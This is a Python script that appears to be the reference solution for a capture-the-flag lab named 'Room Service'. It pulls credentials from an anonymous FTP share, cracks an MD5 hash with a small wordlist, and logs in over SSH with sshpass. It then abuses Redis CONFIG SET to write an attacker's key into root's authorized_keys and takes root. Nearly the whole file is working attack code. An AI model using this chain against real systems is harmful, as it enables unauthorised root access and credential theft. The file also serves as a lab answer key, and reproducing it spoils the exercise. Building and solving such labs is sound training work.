"""Reference solution for Room Service. Usage: python3 - <easy|medium>  (prints {"user":..., "root":...})"""
import hashlib, json, subprocess, sys

FD, BO = "10.66.13.10", "10.66.13.11"
DIFF = sys.argv[1]
SSH = ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "LogLevel=ERROR"]


def run(args, **kw):
    r = subprocess.run(args, capture_output=True, text=True, timeout=60, **kw)
    assert r.returncode == 0, (args, r.stdout, r.stderr)
    return r.stdout


# 1. anonymous FTP
listing = run(["curl", "-s", "ftp://%s/pub/" % FD])
assert "wifi_export.csv" in listing, listing
csv = run(["curl", "-s", "ftp://%s/pub/wifi_export.csv" % FD])
row = next(l for l in csv.splitlines() if l.startswith("concierge,")).split(",")
if DIFF == "easy":
    password = row[1]
else:
    wordlist = ["123456", "password", "welcome", "letmein1", "sunshine1", "iloveyou", "qwerty123"]
    password = next(w for w in wordlist if hashlib.md5(w.encode()).hexdigest() == row[1])


def fd(cmd):
    return run(["sshpass", "-p", password, "ssh", *SSH, "concierge@" + FD, cmd])


# 2. front desk
user_flag = fd("cat /home/concierge/user.txt").strip()
redis_auth = []
if DIFF == "easy":
    assert "backoffice:6379" in fd("cat notes.txt")
else:
    conf = fd("cat /opt/hotel/pms.conf")
    redis_auth = ["-a", next(l.split("=", 1)[1] for l in conf.splitlines() if l.startswith("cache_password=")), "--no-auth-warning"]

# 3. back office Redis -> root's authorized_keys
run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-f", "/tmp/k"])
pub = open("/tmp/k.pub").read().strip()
rc = ["redis-cli", "-h", BO, *redis_auth]
if DIFF == "medium":
    unauth = subprocess.run(["redis-cli", "-h", BO, "ping"], capture_output=True, text=True).stdout
    assert "NOAUTH" in unauth, "medium redis must require auth: %r" % unauth
run(rc + ["config", "set", "dir", "/root/.ssh"])
run(rc + ["config", "set", "dbfilename", "authorized_keys"])
run(rc + ["set", "pk", "\n\n%s\n\n" % pub])
run(rc + ["save"])
root_flag = run(["ssh", *SSH, "-i", "/tmp/k", "root@" + BO, "id -un; cat /root/root.txt"]).split()
assert root_flag[0] == "root", root_flag
print(json.dumps({"user": user_flag, "root": root_flag[1]}))
